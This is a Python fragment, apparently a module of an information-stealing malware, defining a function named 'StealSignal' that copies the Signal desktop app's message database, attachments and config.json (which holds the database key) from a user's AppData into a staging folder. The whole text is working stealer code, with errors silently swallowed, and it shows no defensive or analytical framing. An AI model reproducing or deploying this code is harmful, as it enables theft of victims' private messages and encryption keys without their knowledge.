import os
from pathlib import Path
import shutil


async def StealSignal(self, directory_path: str) -> None:
    try:
        signal_path = os.path.join(self.appdata, 'Signal')
        copied_path = os.path.join(directory_path, "Messenger", "Signal")
        if os.path.isdir(signal_path):
            if not os.path.exists(copied_path):
                os.mkdir(copied_path)
            try:
                if os.path.exists(Path(signal_path) / "sql"):
                    shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
                if os.path.exists(Path(signal_path) / "attachments.noindex"):
                    shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                if os.path.exists(Path(signal_path) / "config.json"):
                    shutil.copy(Path(signal_path) / "config.json", copied_path)
            except Exception as e:
                print(f"copy signal files error - {str(e)}")
                pass
            if len(os.listdir(copied_path)) == 0:
                os.rmdir(copied_path)

    except Exception as e:
        print(f"signal error - {str(e)}")
        pass